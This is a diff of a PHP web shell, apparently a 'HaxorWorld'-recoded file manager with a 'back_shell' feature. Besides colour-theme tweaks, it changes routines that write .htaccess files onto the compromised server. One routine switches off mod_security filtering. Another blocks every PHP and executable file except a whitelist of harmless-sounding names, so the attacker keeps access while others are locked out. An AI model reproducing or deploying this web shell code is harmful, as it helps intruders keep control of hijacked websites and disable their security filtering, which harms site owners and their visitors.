@@ -188,7 +188,7 @@ $GLOBALS['__xxxTYPOxxx_COLOR__'] = array(
 			)
 		),
 		"header_vars" => "#000000",
-		"header_values" => "#2000ff",
+		"header_values" => "#ffffff",
 		"header_on" => "#00FF00",
 		"header_off" => "#ff0000",
 		"header_none" => "#00FF00",
@@ -206,7 +206,7 @@ $GLOBALS['__xxxTYPOxxx_COLOR__'] = array(
 				".back_shell:hover" => "color: {color};",
 			)
 		),
-		"header_pwd" => "#00FF00",
+		"header_pwd" => "#0035ff",
 		"header_pwd:hover" => array(
 			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
@@ -220,10 +220,10 @@ $GLOBALS['__xxxTYPOxxx_COLOR__'] = array(
 				".header_drive:hover" => "color: {color};",
 			)
 		),
-		"header_show_all" => "#00FF00",
+		"header_show_all" => "#0035ff",
 		"disable_functions" => "#ff0000",
 		"footer_text" => "#000000",
-		"menu_options" => "#120b81",
+		"menu_options" => "#ffffff",
 		"menu_options:hover" => array(
 			"key_color" => "#000000",
 			"multi_selector" => array(
@@ -3653,7 +3653,13 @@ echo "$val:";
 }echo "\n";}}
 }else{__alert('failed...');}}
 if(!empty($_POST['xxxTYPOxxx2']) && isset($_POST['xxxTYPOxxx2'])){
-@__write_file($GLOBALS['cwd'].".htaccess","#Recoded By HaxorWorld\n<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
+@__write_file($GLOBALS['cwd'].".htaccess","\n<IfModule mod_security.c>\n<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
+    Order allow,deny
+    Deny from all</FilesMatch>
+<FilesMatch '^(inc.php|index.php|.inc.php|.index.php|cluds.php|pages.php|services.php|upgrade.php|maintenance.php|system.php|includs.php|base.php|elementor.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>");
 echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
 }
 if(!empty($_POST['xxxTYPOxxx1'])&& isset($_POST['xxxTYPOxxx1'])){
@@ -3661,7 +3667,7 @@ if(!empty($_POST['xxxTYPOxxx1'])&& isset($_POST['xxxTYPOxxx1'])){
 echo '<center><b><big> php.ini created...!</center></b></big>';
 }
 if(!empty($_POST['xxxTYPOxxx3']) && isset($_POST['xxxTYPOxxx3'])){
-@__write_file($GLOBALS['cwd'].".htaccess","#Recoded By By HaxorWorld\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
+@__write_file($GLOBALS['cwd'].".htaccess","\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
 echo '<center><b><big>htaccess for Litespeed created...!</center></b></big>';
 }
 echo "<br></div>";
